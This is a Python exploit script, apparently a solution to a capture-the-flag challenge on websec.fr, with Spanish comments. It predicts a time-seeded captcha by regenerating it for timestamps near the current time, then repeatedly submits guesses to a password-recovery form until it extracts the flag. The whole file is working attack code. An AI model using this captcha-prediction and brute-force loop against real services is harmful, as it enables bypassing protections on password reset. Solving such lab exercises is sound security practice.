#!/usr/bin/env python3
import requests, subprocess, time
from html.parser import HTMLParser

URL = "https://websec.fr/level19/index.php"

class TP(HTMLParser):
    def __init__(self):
        super().__init__()
        self.token = None
    def handle_starttag(self, tag, attrs):
        if tag == 'input' and dict(attrs).get('name') == 'token':
            self.token = dict(attrs).get('value')

def cap(s):
    r = subprocess.run(['php', 'gen_captcha.php', str(s)],
                      capture_output=True, text=True, cwd='/workspace/websec_level19')
    return r.stdout.strip()

print("[*] Exploit simple - probando ±15 segundos del timestamp actual\n")

for i in range(500):
    print(f"\r[*] Intento {i+1}/500", end='', flush=True)
    
    s = requests.Session()
    try:
        r = s.get(URL, timeout=15)
        p = TP()
        p.feed(r.text)
        if not p.token:
            continue
        
        t = int(time.time())
        
        # Probar timestamp actual ± 15 segundos
        for off in range(-15, 16):
            c = cap(t + off)
            r2 = s.post(URL, data={'captcha': c, 'token': p.token, 'submit': ''}, timeout=15)
            
            if 'Password recovery email sent' in r2.text:
                print(f"\n\n[+] ¡ÉXITO!")
                print(f"[+] Seed: {t + off}")
                print(f"[+] Captcha: {c}")
                
                import re
                m = re.search(r'WEBSEC\{[^}]+\}', r2.text)
                if m:
                    print(f"[+] FLAG: {m.group(0)}")
                    open('/workspace/websec_level19/flag.txt', 'w').write(m.group(0))
                exit(0)
            
            if 'Invalid session token' in r2.text:
                break
    except:
        pass
    
    time.sleep(0.01)

print("\n[-] Fallo")